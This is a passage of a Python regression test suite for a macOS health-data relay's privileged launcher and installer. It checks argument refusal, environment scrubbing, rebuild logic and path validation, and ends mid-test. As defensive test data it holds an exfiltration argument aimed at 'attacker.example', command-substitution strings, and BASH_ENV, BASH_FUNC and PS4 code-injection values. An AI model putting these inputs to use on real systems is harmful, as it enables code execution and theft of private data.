"""専用ランチャー (``bin/launcher/ihealth-launcher.c``) と ``bin/install-launchd.sh`` の回帰テスト.

launchd の定期実行は、フルディスクアクセスを ``/bin/bash`` ではなくこのランチャーにだけ
与えるために、ランチャー → ``bin/ihealth-run`` の順で起動する。ここでは:

* C ソースが ``-Wall -Wextra -Werror`` で警告なしにビルドできること
* ランチャーが、コンパイル時に埋め込んだスクリプトだけを引数なしで実行し、引数付きで
  起動されたら何も実行せずに 64 で終わること (許可を持つプロセスに ``--slack-webhook``
  などで健康データを別の送り先へ出させない)、環境変数で別のコードを実行させられないこと
* install-launchd.sh が stamp が変わったときだけランチャーを作り直すこと (プロジェクトの
  場所は実体のパスで比べる)、ビルドに失敗しても前のランチャーを壊さず作りかけのファイルを
  残さないこと、``--print-plist`` が何も作らずに使うパスを出すこと、コンパイラが無いときの代替
* ``--build-launcher <dir>`` が定期実行の使うランチャーに触れないこと
* 登録の最後に、許可の付与などの次の手順がコマンド付きで出て、そのコマンドが
  bash / zsh / fish のどれに貼り付けても意図どおり動くこと (macOS)

を確かめる。すべて一時ディレクトリ (一時 HOME とプロジェクトのコピー) で行い、本物の
launchctl・~/Library・プライバシー設定には触れない (launchctl は偽物を PATH の先頭に置く)。
"""

from __future__ import annotations

import os
import plistlib
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


PROJECT_ROOT = Path(__file__).resolve().parent.parent
INSTALLER = PROJECT_ROOT / "bin" / "install-launchd.sh"
LAUNCHER_SRC = PROJECT_ROOT / "bin" / "launcher" / "ihealth-launcher.c"
PLIST_NAME = "com.ihealthrelay.daemon.plist"
PLIST_TEMPLATE = PROJECT_ROOT / "LaunchAgent" / PLIST_NAME
LAUNCHER_REL = Path("Library") / "Application Support" / "ihealth-relay" / "ihealth-launcher"
BASE_PATH = "/usr/bin:/bin"
IS_MACOS = sys.platform == "darwin"
SERVICE = "com.ihealthrelay.daemon"
FDA_URL = "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles"
#: ランチャーが引数付きで起動されたときの終了コード (EX_USAGE)
EXIT_USAGE = 64

#: コンパイル時に埋め込む偽の bin/ihealth-run。受け取ったものを 1 行ずつ出すだけ
FAKE_RUN = """#!/bin/bash
printf 'script=%s\\n' "$0"
for a in "$@"; do printf 'arg=[%s]\\n' "$a"; done
"""

#: 失敗するコンパイラ: -o の出力先に作りかけのファイルを書いてから失敗する
#: (出力先を "$0.ran" に記録して、本当に書いたことを確かめられるようにする)
FAILING_CC = """#!/bin/bash
out=""
while [ "$#" -gt 0 ]; do
    if [ "$1" = "-o" ]; then out="$2"; shift; fi
    shift
done
printf '%s\\n' "$out" > "$0.ran"
[ -n "$out" ] && printf 'partial' > "$out"
exit 1
"""


def find_cc() -> str | None:
    """install-launchd.sh と同じ順 (/usr/bin/cc → PATH の cc) で C コンパイラを探す."""
    if os.path.isfile("/usr/bin/cc") and os.access("/usr/bin/cc", os.X_OK):
        return "/usr/bin/cc"
    return shutil.which("cc", path=BASE_PATH)


CC = find_cc()
NEEDS_CC = unittest.skipUnless(CC, "C コンパイラ (cc) が無い環境")
NEEDS_BASH = unittest.skipUnless(os.path.exists("/bin/bash"), "/bin/bash が無い環境")


def c_string(text: str) -> str:
    """各バイトを 8 進エスケープにした C の文字列リテラル (install-launchd.sh と同じ方式)."""
    return '"' + "".join(f"\\{byte:03o}" for byte in text.encode("utf-8")) + '"'


def write_script(path: Path, text: str) -> Path:
    path.write_text(text, encoding="utf-8")
    path.chmod(0o755)
    return path


def run(argv: list[str], env: dict[str, str] | None = None,
        cwd: Path | None = None) -> "subprocess.CompletedProcess[str]":
    return subprocess.run(
        argv, env=env, cwd=None if cwd is None else str(cwd),
        capture_output=True, encoding="utf-8", errors="replace", timeout=120,
    )


def make_project(parent: Path, name: str = "proj") -> Path:
    """install-launchd.sh が要るものだけを持つプロジェクトのコピー (ihealth-run は偽物).

    返すパスは解決していない (macOS の一時ディレクトリは /var → /private/var の symlink の下)。
    installer は実体のパスを使うので、期待値には :func:`run_script_of` を使う。
    """
    project = parent / name
    (project / "bin" / "launcher").mkdir(parents=True)
    (project / "LaunchAgent").mkdir()
    shutil.copy2(INSTALLER, project / "bin" / "install-launchd.sh")
    shutil.copy2(LAUNCHER_SRC, project / "bin" / "launcher" / "ihealth-launcher.c")
    shutil.copy2(PLIST_TEMPLATE, project / "LaunchAgent" / PLIST_NAME)
    write_script(project / "bin" / "ihealth-run", FAKE_RUN)
    return project


def run_script_of(project: Path) -> str:
    """installer がランチャーに埋め込む (= plist の代替に使う) bin/ihealth-run の実体のパス."""
    return str(project.resolve() / "bin" / "ihealth-run")


def change_launcher_behavior(project: Path) -> None:
    """バイナリが変わるソースの変更 (stamp が合わなくなり、作り直しが必要になる)."""
    source = project / "bin" / "launcher" / "ihealth-launcher.c"
    text = source.read_text(encoding="utf-8")
    assert "メモリを確保できません\\n" in text
    source.write_text(text.replace("メモリを確保できません\\n", "メモリを確保できませんでした\\n"), encoding="utf-8")


def run_installer(project: Path, home: Path, *args: str,
                  extra_env: dict[str, str] | None = None,
                  path: str = BASE_PATH) -> "subprocess.CompletedProcess[str]":
    env = {"HOME": str(home), "PATH": path}
    env.update(extra_env or {})
    return run(["bash", str(project / "bin" / "install-launchd.sh"), *args], env=env)


def build_state(proc: "subprocess.CompletedProcess[str]") -> dict[str, str]:
    """--build-launcher の最後の 2 行 (launcher=... / program=...) を dict にする."""
    values: dict[str, str] = {}
    for line in proc.stdout.splitlines():
        key, sep, value = line.partition("=")
        if sep and key in ("launcher", "program"):
            values[key] = value
    return values


def all_files(root: Path) -> list[Path]:
    return sorted(p for p in root.rglob("*"))


def stat_key(path: Path) -> "tuple[int, int]":
    st = path.stat()
    return st.st_ino, st.st_mtime_ns


@NEEDS_CC
@NEEDS_BASH
class LauncherBinaryTest(unittest.TestCase):
    """C ソースを直接ビルドして、ランチャー自体の振る舞いを確かめる."""

    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name)
        self.markers = self.tmp / "markers"
        self.markers.mkdir()

    def compile(self, run_path: Path, *extra: str) -> "tuple[Path, subprocess.CompletedProcess[str]]":
        """埋め込むスクリプトを run_path にして -Wall -Wextra -Werror でビルドする."""
        out = self.tmp / "ihealth-launcher"
        proc = run([
            str(CC), "-O2", "-Wall", "-Wextra", "-Werror",
            f"-DIHEALTH_RUN_PATH={c_string(str(run_path))}", *extra,
            "-o", str(out), str(LAUNCHER_SRC),
        ])
        self.assertEqual(proc.returncode, 0, proc.stderr)
        return out, proc

    def test_compiles_without_warnings(self):
        run_script = write_script(self.tmp / "run.sh", FAKE_RUN)
        _, proc = self.compile(run_script)
        self.assertEqual(proc.stderr.strip(), "", "-Wall -Wextra -Werror で警告が出ない")

    def test_requires_the_script_path_at_compile_time(self):
        # 既定のスクリプトパスを持たない (= 実行時にも選べない) ことを、#error で守る
        proc = run([str(CC), "-Wall", "-Wextra", "-Werror", "-o", str(self.tmp / "x"), str(LAUNCHER_SRC)])
        self.assertNotEqual(proc.returncode, 0)
        self.assertIn("IHEALTH_RUN_PATH", proc.stderr)

    def test_runs_the_compiled_in_script_without_arguments(self):
        run_dir = self.tmp / "run dir"
        run_dir.mkdir()
        run_script = write_script(run_dir / "ihealth-run", FAKE_RUN)
        launcher, _ = self.compile(run_script)
        proc = run([str(launcher)], env={"PATH": BASE_PATH, "HOME": str(self.tmp)})
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(proc.stdout.splitlines(), [f"script={run_script}"], "引数なしで埋め込んだスクリプトだけ")

    def test_refuses_arguments_without_running_anything(self):
        # 許可を持つランチャーに引数を渡せると、--publisher slack --slack-webhook <URL> などで
        # 読んだ健康データを任意の送り先へ出させられる。引数付きなら何も実行しない
        run_script = write_script(
            self.tmp / "ihealth-run", f"#!/bin/bash\ntouch '{self.markers}/script-ran'\n",
        )
        launcher, _ = self.compile(run_script)
        other = write_script(self.tmp / "other.sh", f"#!/bin/bash\ntouch '{self.markers}/other-ran'\n")
        cases = (
            ["--publisher", "slack", "--slack-webhook", "https://attacker.example/x"],
            ["--publisher", "stdout"],
            ["--markdown-out", str(self.tmp / "out")],
            ["--dry-run"],                       # 黙って無視すると本番の書き込みになる
            [str(other)],                         # 別のスクリプトを選ぶこともできない
            [f"$(touch {self.markers}/subst)"],
            [""],                                 # 空の引数 1 つでも引数あり
        )
        for args in cases:
            with self.subTest(args=args):
                proc = run([str(launcher), *args], env={"PATH": BASE_PATH, "HOME": str(self.tmp)})
                self.assertEqual(proc.returncode, EXIT_USAGE, proc.stderr)
                self.assertEqual(proc.stdout, "")
                self.assertIn("引数は受け付けません", proc.stderr)
                self.assertIn(str(run_script), proc.stderr, "手で実行するときに使うものを示す")
                self.assertEqual(list(self.markers.iterdir()), [], "スクリプトも何も実行しない")
        # 対照: 引数なしならスクリプトが走る (マーカーで「実行しない」を確かめられている証拠)
        self.assertEqual(run([str(launcher)], env={"PATH": BASE_PATH}).returncode, 0)
        self.assertEqual([p.name for p in self.markers.iterdir()], ["script-ran"])

    def test_exit_status_of_the_script_is_returned(self):
        run_script = write_script(self.tmp / "run.sh", "#!/bin/bash\nexit 12\n")
        launcher, _ = self.compile(run_script)
        proc = run([str(launcher)], env={"PATH": BASE_PATH})
        self.assertEqual(proc.returncode, 12, "exec するので ihealth-run の終了コードがそのまま返る")

    def test_drops_environment_variables_that_inject_code(self):
        probe = write_script(self.tmp / "probe.sh", (
            "#!/bin/bash\n"
            'd="$(dirname /a/b)"\n'
            "printf 'dirname=%s\\n' \"$d\"\n"
            "for v in BASH_ENV ENV SHELLOPTS PS4 PYTHONHOME PYTHONPATH DYLD_IHEALTH_TEST KEEP HOME; do\n"
            "  printf '%s=%s\\n' \"$v\" \"$(printenv \"$v\" || echo unset)\"\n"
            "done\n"
        ))
        evil = write_script(self.tmp / "evil.sh", f"touch '{self.markers}/bash_env'\n")
        injected_env = {
            "PATH": BASE_PATH,
            "HOME": str(self.tmp),
            "KEEP": "kept value",
            "BASH_ENV": str(evil),                                   # スクリプトより先に読まれる
            "ENV": str(evil),
            "BASH_FUNC_dirname%%": f"() {{  touch '{self.markers}/func'; echo injected\n}}",
            "SHELLOPTS": "xtrace",                                   # PS4 の展開でコマンドが走る
            "PS4": f"$(touch '{self.markers}/ps4')",
            "PYTHONHOME": "/nonexistent-python-home",
            "PYTHONPATH": "/nonexistent-python-path",
            "DYLD_IHEALTH_TEST": "1",   # macOS では SIP も /bin/bash から消すので、効くのは Linux の CI
        }
        # 対照: bash で直接実行すると、これらの環境変数でコードが走る (テストが空振りでない証拠)
        direct = run(["/bin/bash", str(probe)], env=injected_env)
        self.assertEqual(
            sorted(p.name for p in self.markers.iterdir()), ["bash_env", "func", "ps4"], direct.stderr,
        )
        for marker in self.markers.iterdir():
            marker.unlink()

        launcher, _ = self.compile(probe)
        proc = run([str(launcher)], env=injected_env)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(list(self.markers.iterdir()), [], "ランチャー経由ではどれも実行されない")
        lines = proc.stdout.splitlines()
        self.assertIn("dirname=/a", lines)
        for name in ("BASH_ENV", "ENV", "SHELLOPTS", "PS4", "PYTHONHOME", "PYTHONPATH", "DYLD_IHEALTH_TEST"):
            self.assertIn(f"{name}=unset", lines)
        self.assertIn("KEEP=kept value", lines, "関係のない環境変数はそのまま渡す")
        self.assertIn(f"HOME={self.tmp}", lines)

    def test_exec_failure_exits_126_with_a_message(self):
        run_script = write_script(self.tmp / "run.sh", FAKE_RUN)
        launcher, _ = self.compile(run_script, f"-DIHEALTH_BASH_PATH={c_string('/nonexistent/ihealth-test-bash')}")
        proc = run([str(launcher)], env={"PATH": BASE_PATH})
        self.assertEqual(proc.returncode, 126)
        self.assertIn("ihealth-launcher:", proc.stderr)
        self.assertIn("/nonexistent/ihealth-test-bash", proc.stderr)
        self.assertIn(str(run_script), proc.stderr)


@NEEDS_BASH
class InstallerLauncherTest(unittest.TestCase):
    """install-launchd.sh のランチャーの扱い (launchctl を使わないモードだけ).

    ``--build-launcher`` は一時ディレクトリ ``self.out`` にビルドする。一時 HOME の
    ``Library/Application Support/ihealth-relay`` (定期実行が使うランチャーの場所) は作らない。
    """

    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name)
        self.home = self.tmp / "home"
        self.home.mkdir()
        self.out = self.tmp / "out"
        self.out.mkdir()
        self.launcher = self.out / "ihealth-launcher"
        self.stamp = self.out / "ihealth-launcher.stamp"
        self.live_launcher = self.home / LAUNCHER_REL

    def print_plist(self, project: Path, **kwargs) -> "tuple[dict, subprocess.CompletedProcess[str]]":
        proc = run_installer(project, self.home, "--print-plist", **kwargs)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        return plistlib.loads(proc.stdout.encode("utf-8")), proc

    def build(self, project: Path, **kwargs) -> "tuple[dict, subprocess.CompletedProcess[str]]":
        proc = run_installer(project, self.home, "--build-launcher", str(self.out), **kwargs)
        return build_state(proc), proc

    def test_template_has_a_program_placeholder(self):
        with open(PLIST_TEMPLATE, "rb") as fh:
            plist = plistlib.load(fh)
        self.assertEqual(plist["ProgramArguments"], ["__PROGRAM__"], "ランチャーには引数を渡さない")
        # プレースホルダはコメントに書かない (置換されたパスに "--" があると XML が壊れる)
        text = PLIST_TEMPLATE.read_text(encoding="utf-8")
        comments = re.findall(r"<!--(.*?)-->", text, flags=re.DOTALL)
        self.assertTrue(comments)
        for placeholder in ("__PROGRAM__", "__PROJECT_ROOT__", "__HOME__"):
            self.assertFalse(any(placeholder in c for c in comments), placeholder)

    @NEEDS_CC
    def test_print_plist_shows_the_launcher_and_builds_nothing(self):
        project = make_project(self.tmp)
        plist, _ = self.print_plist(project)
        self.assertEqual(plist["ProgramArguments"], [str(self.live_launcher)])
        self.assertEqual(all_files(self.home), [], "--print-plist はビルドもディレクトリ作成もしない")

    def test_print_plist_falls_back_to_the_script_without_a_compiler(self):
        project = make_project(self.tmp)
        plist, proc = self.print_plist(project, extra_env={"IHEALTH_CC": "/nonexistent/cc"})
        self.assertEqual(plist["ProgramArguments"], [run_script_of(project)])
        self.assertIn("/bin/bash", proc.stderr, "代替のときは bash への許可が要ると警告する")
        self.assertEqual(all_files(self.home), [])

    def test_build_launcher_falls_back_without_a_compiler(self):
        project = make_project(self.tmp)
        state, proc = self.build(project, extra_env={"IHEALTH_CC": "/nonexistent/cc"})
        self.assertEqual(proc.returncode, 1)
        self.assertEqual(state, {"launcher": "fallback", "program": run_script_of(project)})
        self.assertEqual(all_files(self.out), [])
        self.assertNotIn("最後に表示", proc.stdout + proc.stderr, "表示しない手順を予告しない")

    @NEEDS_CC
    def test_rebuilds_only_when_the_stamp_changes(self):
        project = make_project(self.tmp)
        source = project / "bin" / "launcher" / "ihealth-launcher.c"

        state, proc = self.build(project)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(state, {"launcher": "built", "program": str(self.launcher)})
        # ビルド先は定期実行のランチャーではないので、許可の付与 (表示しない手順) は予告しない
        self.assertNotIn("最後に表示", proc.stdout + proc.stderr)
        first = stat_key(self.launcher)
        stamp = self.stamp.read_text(encoding="utf-8")
        self.assertIn(f"run_path={run_script_of(project)}\n", stamp)

        # 2 回目: 何も変わっていなければ作り直さない (同じファイル = 与えた許可が有効なまま)
        state, proc = self.build(project)
        self.assertEqual(state["launcher"], "current", proc.stdout)
        self.assertEqual(stat_key(self.launcher), first)

        # コメントだけの変更: 作り直すが、中身が同じなのでファイルは置き換えない
        source.write_text(source.read_text(encoding="utf-8") + "/* comment only */\n", encoding="utf-8")
        state, proc = self.build(project)
        self.assertEqual(state["launcher"], "same", proc.stdout)
        self.assertEqual(self.launcher.stat().st_ino, first[0])
        self.assertNotEqual(self.stamp.read_text(encoding="utf-8"), stamp, "stamp は新しいソースに合わせる")

        # 中身の変わる変更: 新しいバイナリに置き換える
        change_launcher_behavior(project)
        state, proc = self.build(project)
        self.assertEqual(state["launcher"], "built", proc.stdout)
        self.assertNotEqual(self.launcher.stat().st_ino, first[0])
        changed = self.launcher.stat()

        # stamp どおりでも、バイナリ自体が書き換えられていたら作り直す
        with open(self.launcher, "ab") as fh:
            fh.write(b"\0")
        state, _ = self.build(project)
        self.assertEqual(state["launcher"], "built")
        self.assertNotEqual(self.launcher.stat().st_ino, changed.st_ino)

        # コンパイラが無くても、stamp どおりのランチャーはそのまま使う
        state, proc = self.build(project, extra_env={"IHEALTH_CC": "/nonexistent/cc"})
        self.assertEqual(state["launcher"], "current", proc.stderr)
        self.assertEqual(proc.returncode, 0)

        # プロジェクトを移すと埋め込むパスが変わるので作り直す
        moved = make_project(self.tmp, "moved project")
        state, _ = self.build(moved)
        self.assertEqual(state["launcher"], "built")
        self.assertIn(f"run_path={run_script_of(moved)}\n", self.stamp.read_text(encoding="utf-8"))

        # 作り直しが必要なのにコンパイラが無い: 代替 (bin/ihealth-run)
        state, proc = self.build(project, extra_env={"IHEALTH_CC": "/nonexistent/cc"})
        self.assertEqual(proc.returncode, 1)
        self.assertEqual(state, {"launcher": "fallback", "program": run_script_of(project)})
        # 定期実行が使うランチャー (一時 HOME の下) は最後まで作られない
        self.assertEqual(all_files(self.home), [])

    @NEEDS_CC
    def test_failed_compile_keeps_the_previous_launcher_and_leaves_no_partial_files(self):
        project = make_project(self.tmp)
        state, proc = self.build(project)
        self.assertEqual(state.get("launcher"), "built", proc.stdout + proc.stderr)
        before = stat_key(self.launcher)
        stamp = self.stamp.read_text(encoding="utf-8")

        change_launcher_behavior(project)   # 作り直しが必要な状態にする
        failing_cc = write_script(self.tmp / "failing-cc", FAILING_CC)
        state, proc = self.build(project, extra_env={"IHEALTH_CC": str(failing_cc)})
        self.assertEqual(proc.returncode, 1)
        self.assertEqual(state, {"launcher": "fallback", "program": run_script_of(project)})
        self.assertIn("コンパイルに失敗", proc.stderr)
        # 偽のコンパイラは本当にビルド先へ作りかけのファイルを書いた (下の確認が空振りでない証拠)
        written = Path((self.tmp / "failing-cc.ran").read_text(encoding="utf-8").strip())
        self.assertEqual(written.parent, self.out)
        self.assertEqual(
            sorted(p.name for p in self.out.iterdir()), ["ihealth-launcher", "ihealth-launcher.stamp"],
            "作りかけのファイルを残さない",
        )
        self.assertEqual(stat_key(self.launcher), before, "前のランチャーはそのまま")
        self.assertEqual(self.stamp.read_text(encoding="utf-8"), stamp)

    @NEEDS_CC
    def test_build_launcher_never_touches_the_scheduled_launcher(self):
        # 定期実行のジョブが起動するファイルを置き換えると、ジョブが別の clone の ihealth-run を
        # 実行するようになり、与えたフルディスクアクセスも効かなくなる
        project = make_project(self.tmp)
        live_dir = self.live_launcher.parent
        live_dir.mkdir(parents=True)
        self.live_launcher.write_bytes(b"scheduled launcher")
        self.live_launcher.chmod(0o755)
        (live_dir / "ihealth-launcher.stamp").write_text("run_path=/elsewhere/bin/ihealth-run\n", encoding="utf-8")
        before = {p.name: (stat_key(p), p.read_bytes()) for p in live_dir.iterdir()}
        link = self.tmp / "link-to-live"
        link.symlink_to(live_dir, target_is_directory=True)

        cases = [
            ((), "ビルド先のディレクトリを指定"),
            (("--print-plist",), "ビルド先のディレクトリを指定"),
            ((str(self.tmp / "missing"),), "ありません"),
            ((str(live_dir),), "定期実行が使うランチャーのディレクトリ"),
            ((str(link),), "定期実行が使うランチャーのディレクトリ"),
        ]
        upper = Path(str(live_dir.resolve()).upper())
        if upper.exists() and str(upper) != str(live_dir.resolve()):   # 大文字小文字を区別しない FS
            cases.append(((str(upper),), "定期実行が使うランチャーのディレクトリ"))
        for args, message in cases:
            with self.subTest(args=args):
                proc = run_installer(project, self.home, "--build-launcher", *args)
                self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
                self.assertIn(message, proc.stderr)
                self.assertNotIn("launcher=", proc.stdout)
        proc = run_installer(project, self.home, "--print-plist", "--build-launcher", str(self.out))
        self.assertEqual(proc.returncode, 2, "モードは 1 つだけ")
        self.assertEqual({p.name: (stat_key(p), p.read_bytes()) for p in live_dir.iterdir()}, before)

        # 別のディレクトリならビルドでき、定期実行のランチャーには触れない
        state, proc = self.build(project)
        self.assertEqual(state.get("launcher"), "built", proc.stdout + proc.stderr)
        self.assertIn("触れていません", proc.stdout)
        self.assertEqual({p.name: (stat_key(p), p.read_bytes()) for p in live_dir.iterdir()}, before)

    @NEEDS_CC
    def test_project_location_is_compared_by_its_real_path(self):
        # symlink 経由や大文字小文字の違う綴りで実行しても、同じ場所なら作り直さない
        # (作り直すと cdhash が変わり、与えたフルディスクアクセスが外れる)
        real = self.tmp / "real"
        real.mkdir()
        project = make_project(real)
        link = self.tmp / "link"
        link.symlink_to(real, target_is_directory=True)
        via_link = link / project.name

        state, proc = self.build(project)
        self.assertEqual(state.get("launcher"), "built", proc.stdout + proc.stderr)
        first = stat_key(self.launcher)
        stamp = self.stamp.read_text(encoding="utf-8")
        self.assertIn(f"run_path={run_script_of(project)}\n", stamp)

        state, proc = self.build(via_link)
        self.assertEqual(state["launcher"], "current", proc.stdout + proc.stderr)
        # `cd link/proj && ./bin/install-launchd.sh` (シェルの論理パスが symlink 側)
        proc = run(
            ["bash", "./bin/install-launchd.sh", "--build-launcher", str(self.out)],
            env={"HOME": str(self.home), "PATH": BASE_PATH, "PWD": str(via_link)}, cwd=via_link,
        )
        self.assertEqual(build_state(proc).get("launcher"), "current", proc.stdout + proc.stderr)
        upper = Path(str(project.resolve()).upper())
        if upper.exists() and str(upper) != str(project.resolve()):     # 大文字小文字を区別しない FS
            state, proc = self.build(upper)
            self.assertEqual(state["launcher"], "current", proc.stdout + proc.stderr)
        self.assertEqual(stat_key(self.launcher), first)
        self.assertEqual(self.stamp.read_text(encoding="utf-8"), stamp)

        # 代替のときに plist へ入れるパスも実体のパス
        plist, _ = self.print_plist(via_link, extra_env={"IHEALTH_CC": "/nonexistent/cc"})
        self.assertEqual(plist["ProgramArguments"], [run_script_of(project)])

    @NEEDS_CC
    def test_built_launcher_runs_the_project_script(self):
        # 空白・日本語・引用符・trigraph ("??=") を含むパスでも、埋め込んだ C の文字列が壊れない
        project = make_project(self.tmp, "proj dir it's 日本??=")
        state, proc = self.build(project)
        self.assertEqual(state.get("launcher"), "built", proc.stdout + proc.stderr)
        self.assertNotIn("warning", proc.stderr.lower())
        result = run([str(self.launcher)], env={"PATH": BASE_PATH})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.splitlines(), [f"script={run_script_of(project)}"])
        refused = run([str(self.launcher), "--date", "2026-10-10"], env={"PATH": BASE_PATH})
        self.assertEqual(refused.returncode, EXIT_USAGE)
        self.assertEqual(refused.stdout, "")

    def test_rejects_paths_that_would_break_the_generated_files(self):
        for name in ('quote"dir', "dollar$dir", "back`tick", "bang!dir", "new\nline"):
            with self.subTest(project=name):
                project = make_project(self.tmp, name)
                proc = run_installer(project, self.home, "--print-plist")
                self.assertEqual(proc.returncode, 1, proc.stdout)
                self.assertIn("PROJECT_ROOT", proc.stderr)
                self.assertEqual(proc.stdout, "")
        self.assertEqual(all_files(self.home), [])
        # HOME も plist と最後に表示するコマンドに入る
        project = make_project(self.tmp, "ok")
        for name in ('home"q', "home$d", "home`b", "home!x", "home|p"):
            with self.subTest(home=name):
                home = self.tmp / name
                home.mkdir()
                proc = run_installer(project, home, "--print-plist")
                self.assertEqual(proc.returncode, 1, proc.stdout)
                self.assertIn("HOME", proc.stderr)
                self.assertEqual(proc.stdout, "")
                self.assertEqual(all_files(home), [])


#: launchctl print の出力の例 (入れ子の "state = active" を含む)
LAUNCHCTL_PRINT_SAMPLE = (
    f"gui/501/{SERVICE} = {{\n"
    "\tactive count = 0\n"
    f"\tpath = /Users/me/Library/LaunchAgents/{PLIST_NAME}\n"
    "\ttype = LaunchAgent\n"
    "\tstate = not running\n"
    "\n"
    "\tprogram = /Users/me/Library/Application Support/ihealth-relay/ihealth-launcher\n"
    "\truns = 1\n"
    "\tlast exit code = 0\n"
    "\n"
    "\tevent triggers = {\n"
    f"\t\t{SERVICE}.268435471 => {{\n"
    "\t\t\tkeepalive = 0\n"
    "\t\t\tstate = 1\n"
    "\t\t}\n"
    "\t}\n"
    "\n"
    "\tendpoints = {\n"
    "\t\tstate = active\n"
    "\t}\n"
    "}\n"
)


def obsidian_run_log() -> str:
    """2 回分の日記の実行を含む run.log (2 回目が最後の実行)."""
    return (
        "2026-10-11 21:00:01 [INFO] ihealth: ihealth-relay 起動 (dates=2026-10-04..2026-10-11 (8 日))\n"
        "2026-10-11 21:00:05 [INFO] ihealth: 日記 2026-10-04: note=ok 書込=0 キー / "
        "health=failed weather=complete github=complete\n"
        "2026-10-11 21:00:09 [WARNING] ihealth: 日記 完了: 8 / 8 日 (…), 書込 0 キー, 失敗 1 件, exit=12\n"
        "2026-10-12 07:00:01 [INFO] ihealth: ihealth-relay 起動 (dates=2026-10-05..2026-10-12 (8 日))\n"
        "2026-10-12 07:00:02 [INFO] ihealth.source: 関係のない行\n"
        "2026-10-12 07:00:03 [INFO] ihealth: 日記 2026-10-05: note=ok 書込=2 キー (a, b) / "
        "health=complete weather=complete github=complete\n"
        "2026-10-12 07:00:04 [INFO] ihealth: 日記 2026-09-01 の未確定の値 (x) は 30 日以内に確定しなかった\n"
        "2026-10-12 07:00:05 [INFO] ihealth: 日記 2026-10-12: note=ok 書込=1 キー (c) / "
        "health=nodata weather=partial github=complete [暫定]\n"
        "2026-10-12 07:00:09 [INFO] ihealth: 日記 完了: 8 / 8 日 (…), 書込 3 キー, 失敗 0 件, exit=0\n"
    )


def single_day_run_log() -> str:
    """2 回分の単日 publisher (notion など) の実行を含む run.log."""
    return (
        "2026-10-10 07:00:01 [INFO] ihealth: ihealth-relay 起動 (target=2026-10-09, dry_run=False, publisher=notion)\n"
        "2026-10-10 07:00:02 [ERROR] ihealth: データ取得に失敗しました: [Errno 1] Operation not permitted\n"
        "2026-10-11 07:00:01 [INFO] ihealth: ihealth-relay 起動 (target=2026-10-10, dry_run=False, publisher=notion)\n"
        "2026-10-11 07:00:03 [INFO] ihealth: 集計完了: target=2026-10-10 populated=13/15\n"
        "2026-10-11 07:00:04 [INFO] ihealth.publishers: 関係のない行\n"
    )


def paste_shells() -> "list[list[str]]":
    """貼り付け先として確かめるシェル (設定ファイルを読まない起動の仕方)."""
    shells = [["/bin/bash", "--noprofile", "--norc", "-c"]]
    if os.path.exists("/bin/zsh"):
        shells.append(["/bin/zsh", "-f", "-c"])
    fish = shutil.which("fish", path="/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin")
    if fish and run([fish, "--no-config", "-c", "true"]).returncode == 0:
        shells.append([fish, "--no-config", "-c"])
    return shells


@unittest.skipUnless(IS_MACOS, "codesign / dyld / launchd は macOS だけ")
@NEEDS_CC
class InstallerMacOSTest(unittest.TestCase):
    """macOS: 署名・dyld の差し込み防止・登録の最後に出る次の手順."""

    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name)
        self.home = self.tmp / "home"
        self.home.mkdir()
        self.out = self.tmp / "out"
        self.out.mkdir()
        self.launcher = self.home / LAUNCHER_REL
        self.fakebin = self.tmp / "fakebin"
        self.fakebin.mkdir()
        self.launchctl_log = self.tmp / "launchctl.log"
        (self.tmp / "launchctl-print.txt").write_text(LAUNCHCTL_PRINT_SAMPLE, encoding="utf-8")
        write_script(self.fakebin / "launchctl", (
            "#!/bin/bash\n"
            "printf '%s\\n' \"$*\" >> \"$FAKE_LAUNCHCTL_LOG\"\n"
            "case \"$1\" in\n"
            f"  list) printf -- '-\\t0\\t{SERVICE}\\n' ;;\n"
            f"  print) case \"$2\" in */{SERVICE}) cat \"$FAKE_LAUNCHCTL_PRINT\" ;; *) exit 113 ;; esac ;;\n"
            "  bootout) exit 3 ;;\n"
            "esac\n"
            "exit 0\n"
        ))
        self.path = f"{self.fakebin}:/usr/bin:/bin:/usr/sbin:/sbin"
        # 本物の launchctl を絶対に呼ばない: 偽物が先に見つかることを確かめてから実行する
        self.assertEqual(shutil.which("launchctl", path=self.path), str(self.fakebin / "launchctl"))
        self.env = {
            "FAKE_LAUNCHCTL_LOG": str(self.launchctl_log),
            "FAKE_LAUNCHCTL_PRINT": str(self.tmp / "launchctl-print.txt"),
            "TMPDIR": str(self.tmp),
        }

    def install(self, project: Path, **extra_env: str) -> "subprocess.CompletedProcess[str]":
        proc = run_installer(project, self.home, extra_env={**self.env, **extra_env}, path=self.path)
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        return proc

    def check_pasted_commands(self, tail: str, prefix: str, expected: "list[str]") -> None:
        """最後の手順にある prefix で始まるコマンドを、各シェルに貼り付けたとおりに実行する."""
        commands = [line.strip() for line in tail.splitlines() if line.strip().startswith(prefix)]
        self.assertEqual(len(commands), 1, tail)
        for shell in paste_shells():
            with self.subTest(shell=shell[0], command=prefix):
                proc = run([*shell, commands[0]], env={"PATH": self.path, **self.env})
                self.assertEqual(proc.returncode, 0, proc.stderr)
                self.assertEqual(proc.stdout.splitlines(), expected)

    def test_launcher_is_signed_and_ignores_dyld_insert_libraries(self):
        project = make_project(self.tmp)
        proc = run_installer(project, self.home, "--build-launcher", str(self.out))
        self.assertEqual(build_state(proc).get("launcher"), "built", proc.stdout + proc.stderr)
        launcher = self.out / "ihealth-launcher"
        sign = run(["codesign", "-dv", str(launcher)])
        self.assertIn("Identifier=com.ihealthrelay.launcher", sign.stderr)
        self.assertEqual(run(["codesign", "--verify", "--strict", str(launcher)]).returncode, 0)

        inj_src = self.tmp / "inj.c"
        inj_src.write_text(
